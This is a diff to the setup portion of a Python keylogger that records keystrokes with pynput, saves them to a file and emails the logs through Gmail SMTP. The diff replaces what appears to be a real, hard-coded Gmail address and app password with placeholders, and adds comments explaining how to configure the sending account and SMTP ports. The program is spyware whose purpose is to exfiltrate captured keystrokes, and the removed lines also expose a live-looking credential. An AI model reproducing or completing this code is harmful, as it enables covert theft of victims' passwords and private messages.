@@ -2,15 +2,21 @@ import smtplib
 import ssl
 from pynput import keyboard
 
-sender_mail = "takella6315@gmail.com"
-receiver_mail = "takella6315@gmail.com"
-password = "tvxlblpmfarglzrv"
-message = """From: takella6315@gmail.com
-To: takella6315@gmail.com                     
-Subject: Logs from Keylogger1
+
+sender_mail = "sender_email@gmail.com"
+#Change this to the email of the sender. Example: bob123@gmail.com
+receiver_mail = "receiver_email@gmail.com"
+#change this to the email of the receiver. Example: Dave123@gmail.com
+password = "Email App password"
+#In gmail settings you will need to turn on two factor authentication and also create an app password.
+message = """From: sender_email@gmail.com
+To: receiver_email@gmail.com                     
+Subject: Logs from Keylogger
 Text: The keylogger has logged this: 
 """
-port = 25
+port = 25 
+#this will work on ports 25, 465, and 587 but the method of connecting to the SMTP server will be different. 
+#Go to this website for refrence of how to set up the other methods: https://realpython.com/python-send-email/
 def write(text):
     with open("keylogger.txt",'a') as f:
         f.write(text)
